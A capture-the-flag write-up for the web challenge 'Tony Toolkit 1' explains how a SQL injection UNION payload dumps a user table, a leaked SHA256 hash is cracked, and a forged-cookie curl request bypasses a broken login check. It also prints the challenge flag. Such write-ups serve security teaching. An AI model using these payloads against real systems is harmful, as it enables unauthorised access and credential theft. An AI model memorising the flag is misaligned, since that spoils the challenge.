# Tony Toolkit 1

## Challenge Info
- **Category**: Web (SQLi + Hash Cracking + Cookie Manipulation)
- **Remote**: `http://chall.0xfun.org:49242`
- **Stack**: Flask (Werkzeug/3.1.3, Python/3.10.19, SQLite)
- **Flag**: `0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}`

## Analysis

### Recon
- `robots.txt` reveals: `/main.pyi` (source code), `/user`, `/secret/hints.txt`
- Source code at `/main.pyi` shows full Flask app with SQLite backend
- Hints: common passwords, cookies are fun

### Vulnerabilities Found
1. **SQL Injection** in `/search` - string concatenation: `"...LIKE '%" + str(item) + "%'"`
2. **Broken auth check** - `is_logged_in()` never compares cookie to hash (always returns True)
3. **Cookie-controlled access** - `userID` cookie directly controls which profile is loaded

## Exploitation

### Step 1: SQLi to dump Users table
```
/search?item=NONEXISTENT' UNION SELECT userID||':'||username||':'||password,1 FROM Users--
```
Results:
- UserID 1: Admin (hash all zeros - fake/placeholder)
- UserID 2: Jerry, hash `059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08`

### Step 2: Crack Jerry's password
SHA256 hash cracked against SecLists 10k-most-common: **`1qaz2wsx`**

### Step 3: Cookie manipulation to access Admin profile
The `is_logged_in()` function is buggy - it loops through all users and checks:
```python
if sha256(f"{name}:{password}:{SECRET_LOGIN_TOKEN}".encode()).hexdigest(): return True
```
It never compares the cookie value! A SHA256 digest is always truthy, so this ALWAYS returns True.

Simply set cookies `userID=1` and `user=anything`:
```bash
curl -b "userID=1;user=anything" http://chall.0xfun.org:49242/user
```

## Key Lessons
1. `robots.txt` is always worth checking - exposed source code and hints
2. Broken auth: always compare the actual cookie value, not just check if a hash exists
3. Chain of vulns: SQLi → hash cracking → cookie manipulation → flag
